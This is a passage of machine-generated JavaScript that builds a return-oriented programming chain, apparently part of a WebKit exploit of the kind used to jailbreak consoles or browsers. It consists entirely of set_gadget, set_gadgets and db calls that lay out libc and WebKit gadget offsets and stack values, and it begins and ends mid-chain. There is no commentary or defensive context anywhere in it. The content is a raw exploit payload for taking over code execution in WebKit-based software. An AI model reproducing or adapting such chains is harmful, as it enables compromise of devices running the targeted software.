set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+194656,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+194672,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+194824,
webkit_base+7438103,
libc_base+793877,
ropchain+194856,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+194808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+194840,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+194976,
webkit_base+7438103,
libc_base+793877,
ropchain+194992,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+194960,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+195080,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+195136,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+195256,
webkit_base+7438103,
libc_base+793877,
ropchain+195288,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+195272,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+270096,
libc_base+793877,
ropchain+195448,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+195400,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+195416,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+195504,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+195608,
webkit_base+7438103,
libc_base+793877,
ropchain+195640,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+195624,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+195800,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+195752,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+195768,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+195856,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+195960,
webkit_base+7438103,
libc_base+793877,
ropchain+195992,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+195976,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+196152,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+196104,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+196120,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+196208,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+196312,
webkit_base+7438103,
libc_base+793877,
ropchain+196344,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+196328,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+196416,
webkit_base+7438103,
libc_base+793877,
ropchain+196432,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+196592,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+196544,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+196560,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+196648,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+196752,
webkit_base+7438103,
libc_base+793877,
ropchain+196784,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+196768,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+196880,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+196864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+196960,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+197064,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+197080,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+197224,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+197192,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+197208,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+197296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+197352,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+197432,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+197536,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+197552,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+197704,
webkit_base+7438103,
libc_base+793877,
ropchain+197736,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+197688,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+197720,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+197856,
webkit_base+7438103,
libc_base+793877,
ropchain+197872,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+197840,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+197960,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+198016,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+198088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+198144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,

libc_base+793877,
ropchain+198232,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+198336,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+198352,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+198504,
webkit_base+7438103,
libc_base+793877,
ropchain+198536,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+198488,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+198520,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+198632,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+198616,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+198720,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+198776,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967276, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+793877,
ropchain+198856,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+811575,
ropchain+192768,

libc_base+811575,
ropchain+209104,

libc_base+50775,
libc_base+793877,
ropchain+198968,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([2, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+199184,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+217280,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+199256,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+50775,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+793877,
ropchain+199376,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+50775,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+793877,
ropchain+199472,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199544,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199616,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199688,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199760,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199832,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199904,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+199976,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+759626,
libc_base+793877
]);

db([4294967257, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+200072,
webkit_base+7438103,
libc_base+792472
]);

db([2, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+759626,
libc_base+793877
]);

db([4294967258, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+200160,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([15395, 0]);
set_gadgets([
libc_base+562536,
libc_base+793877,
ropchain+200232,
webkit_base+7438103,
libc_base+759626,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967260, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+200312,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+954100,
libc_base+793877,
ropchain+200360,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([16, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+200472,
webkit_base+7438103,
libc_base+793877
]);

db([4294967256, 4294967295]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+200560,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+200664,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+200680,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+200832,
webkit_base+7438103,
libc_base+793877,
ropchain+200864,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+200816,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+200848,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+200960,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+200944,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+201064,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+213296,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+201184,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+201288,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+201304,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+201456,
webkit_base+7438103,
libc_base+793877,
ropchain+201488,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+201440,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+201472,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+201584,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+201568,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+201688,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+211968,

libc_base+882884,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+201856,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+201960,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+201976,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+202128,
webkit_base+7438103,
libc_base+793877,
ropchain+202160,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+202112,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+202144,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+202256,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+202240,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+202360,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+210640,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+202496,
webkit_base+7438103,
libc_base+793877,
ropchain+202512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+202480,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+202632,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+202616,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967272, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+202776,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+202792,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+202912,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+202896,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967248, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967244, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+203032,
webkit_base+7438103,
libc_base+792472
]);

db([65536, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+954100,
libc_base+793877,
ropchain+203088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+793877,
ropchain+203136,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967244, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+203240,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+203256,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+203408,
webkit_base+7438103,
libc_base+793877,
ropchain+203440,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+203392,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+203424,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+203512,
webkit_base+7438103,
libc_base+793877,
ropchain+203528,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+203632,
webkit_base+7438103,
libc_base+793877,
ropchain+203680,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+203648,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+203792,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+203784,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+203808,
ropchain+209072,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967244, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+203928,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+203944,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+204096,
webkit_base+7438103,
libc_base+793877,
ropchain+204128,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+204080,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+204112,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+204200,
webkit_base+7438103,
libc_base+793877,
ropchain+204216,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+204312,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+204296,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+204392,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+204496,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+204512,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+204656,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+204624,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+204640,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+204736,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+204840,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+204856,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+205008,
webkit_base+7438103,
libc_base+793877,
ropchain+205040,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+204992,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+205024,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+205136,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+205120,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+205240,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+214624,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+205312,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967240, 4294967295]);
